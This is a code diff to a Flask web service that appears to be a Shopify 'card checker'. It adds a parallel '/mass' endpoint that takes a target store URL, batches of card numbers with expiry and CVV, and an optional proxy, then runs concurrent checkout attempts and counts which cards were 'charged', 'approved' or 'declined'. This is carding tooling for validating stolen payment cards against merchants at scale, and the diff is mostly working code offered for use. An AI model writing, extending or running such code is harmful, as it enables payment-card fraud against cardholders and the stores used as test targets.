@@ -993,6 +993,7 @@ def health():
 
 @app.route('/shopify', methods=['GET'])
 def shopify_checker():
+    """Single card check"""
     try:
         site = request.args.get('site')
         cc_string = request.args.get('cc')
@@ -1011,7 +1012,7 @@ def shopify_checker():
         
         cc, mes, ano, cvv = cc_parts
         
-        # Run the actual Shopify checker
+        # Run single check
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         
@@ -1022,68 +1023,9 @@ def shopify_checker():
         finally:
             loop.close()
         
-        # Format response based on status
-        if success:
-            # Check for specific response types
-            if "ORDER_PLACED" in message or "CHARGED" in message:
-                return jsonify({
-                    "Gateway": gateway,
-                    "Price": float(price) if price else 0.0,
-                    "Response": "𝘾𝙝𝙖𝙧𝙜𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: ORDER_PLACED",
-                    "Status": True,
-                    "cc": cc_string
-                })
-            elif "INSUFFICIENT_FUNDS" in message or "INSUFFICIENT" in message:
-                return jsonify({
-                    "Gateway": gateway,
-                    "Price": float(price) if price else 0.0,
-                    "Response": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INSUFFICIENT_FUNDS",
-                    "Status": True,
-                    "cc": cc_string
-                })
-            elif "INCORRECT_CVC" in message or "CVC" in message or "CVV" in message:
-                return jsonify({
-                    "Gateway": gateway,
-                    "Price": float(price) if price else 0.0,
-                    "Response": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INCORRECT_CVC",
-                    "Status": True,
-                    "cc": cc_string
-                })
-            elif "OTP_REQUIRED" in message or "OTP" in message or "3DS" in message:
-                return jsonify({
-                    "Gateway": gateway,
-                    "Price": float(price) if price else 0.0,
-                    "Response": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: OTP_REQUIRED",
-                    "Status": True,
-                    "cc": cc_string
-                })
-            else:
-                # Default approved
-                return jsonify({
-                    "Gateway": gateway,
-                    "Price": float(price) if price else 0.0,
-                    "Response": f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: {message[:30]}",
-                    "Status": True,
-                    "cc": cc_string
-                })
-        else:
-            # Declined
-            if "CAPTCHA" in message:
-                return jsonify({
-                    "Gateway": gateway,
-                    "Price": 0.0,
-                    "Response": "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: CAPTCHA_REQUIRED",
-                    "Status": False,
-                    "cc": cc_string
-                })
-            else:
-                return jsonify({
-                    "Gateway": gateway,
-                    "Price": 0.0,
-                    "Response": "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: CARD_DECLINED",
-                    "Status": False,
-                    "cc": cc_string
-                })
+        # Format response
+        response_data = format_response(success, message, gateway, price, cc_string)
+        return jsonify(response_data)
         
     except Exception as e:
         return jsonify({
@@ -1094,13 +1036,177 @@ def shopify_checker():
             "Response": f"ERROR: {str(e)}",
             "cc": request.args.get('cc', '')
         }), 500
+
+
+# ============================================================
+# MASS CHECK ENDPOINT (PARALLEL)
+# ============================================================
+
+@app.route('/mass', methods=['POST'])
+def mass_checker():
+    """
+    Mass card check with parallel processing
+    Expects JSON: {"site": "https://store.com", "cards": ["cc1|mm|yy|cvv", "cc2|..."]}
+    Optional: {"proxy": "proxy:port", "workers": 5}
+    """
+    try:
+        data = request.get_json()
         
+        if not data:
+            return jsonify({"error": "Missing JSON payload"}), 400
+        
+        site = data.get('site')
+        cards = data.get('cards', [])
+        proxy_str = data.get('proxy')
+        workers = data.get('workers', 5)  # Default 5 parallel workers
+        
+        if not site:
+            return jsonify({"error": "Missing 'site' parameter"}), 400
+        
+        if not cards:
+            return jsonify({"error": "Missing 'cards' array"}), 400
+        
+        if not isinstance(cards, list):
+            return jsonify({"error": "'cards' must be an array"}), 400
+        
+        # Parse all cards
+        parsed_cards = []
+        for card_string in cards:
+            cc_parts = card_string.split('|')
+            if len(cc_parts) == 4:
+                parsed_cards.append({
+                    'cc': cc_parts[0].strip(),
+                    'mes': cc_parts[1].strip(),
+                    'ano': cc_parts[2].strip(),
+                    'cvv': cc_parts[3].strip(),
+                    'original': card_string
+                })
+        
+        if not parsed_cards:
+            return jsonify({"error": "No valid cards found"}), 400
+        
+        # Run parallel checks
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        try:
+            results = loop.run_until_complete(
+                run_parallel_checks(site, parsed_cards, proxy_str, workers)
+            )
+        finally:
+            loop.close()
+        
+        # Count results
+        charged = 0
+        approved = 0
+        declined = 0
+        errors = 0
+        
+        for result in results:
+            if result['Status']:
+                if 'ORDER_PLACED' in result['Response'] or 'CHARGED' in result['Response']:
+                    charged += 1
+                else:
+                    approved += 1
+            else:
+                if 'ERROR' in result['Response']:
+                    errors += 1
+                else:
+                    declined += 1
+        
+        return jsonify({
+            "total": len(results),
+            "charged": charged,
+            "approved": approved,
+            "declined": declined,
+            "errors": errors,
+            "results": results,
+            "site": site,
+            "time": time.time()
+        })
+        
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+# ============================================================
+# PARALLEL CHECK FUNCTION
+# ============================================================
+
+async def run_parallel_checks(site, cards, proxy_str=None, workers=5):
+    """Run multiple card checks in parallel"""
+    semaphore = asyncio.Semaphore(workers)
+    
+    async def check_one(card_data):
+        async with semaphore:
+            try:
+                success, message, gateway, price, currency = await process_card_async(
+                    card_data['cc'],
+                    card_data['mes'],
+                    card_data['ano'],
+                    card_data['cvv'],
+                    site,
+                    None,
+                    proxy_str
+                )
+                
+                response_data = format_response(success, message, gateway, price, card_data['original'])
+                return response_data
+                
+            except Exception as e:
+                return {
+                    "cc": card_data['original'],
+                    "Gateway": "ERROR",
+                    "Price": 0.0,
+                    "Response": f"ERROR: {str(e)}",
+                    "Status": False
+                }
+    
+    tasks = [check_one(card) for card in cards]
+    return await asyncio.gather(*tasks)
+
+
+# ============================================================
+# RESPONSE FORMATTER
+# ============================================================
+
+def format_response(success, message, gateway, price, cc_string):
+    """Format response with proper status messages"""
+    
+    if success:
+        if "ORDER_PLACED" in message or "CHARGED" in message:
+            response_text = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: ORDER_PLACED"
+        elif "INSUFFICIENT_FUNDS" in message or "INSUFFICIENT" in message:
+            response_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INSUFFICIENT_FUNDS"
+        elif "INCORRECT_CVC" in message or "CVC" in message or "CVV" in message:
+            response_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INCORRECT_CVC"
+        elif "OTP_REQUIRED" in message or "OTP" in message or "3DS" in message:
+            response_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: OTP_REQUIRED"
+        else:
+            response_text = f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: {message[:30]}"
+    else:
+        if "CAPTCHA" in message:
+            response_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: CAPTCHA_REQUIRED"
+        else:
+            response_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: CARD_DECLINED"
+    
+    return {
+        "Gateway": gateway if gateway else "Shopify",
+        "Price": float(price) if price and price.replace('.', '', 1).isdigit() else 0.0,
+        "Response": response_text,
+        "Status": success,
+        "cc": cc_string
+    }
+
+
 # ============================================================
 # MAIN
 # ============================================================
 
 if __name__ == '__main__':
     port = int(os.getenv('PORT', 8080))
-    print("🔥 Shopify API running on port", port)
-    print("📡 Endpoint: /shopify")
+    print("🟢 Shopify API running on port", port)
+    print("🟣 Single Check: /shopify?site=URL&cc=CC|MM|YY|CVV")
+    print("🟣 Mass Check: POST /mass with JSON")
     app.run(host='0.0.0.0', port=port, debug=False)
+        
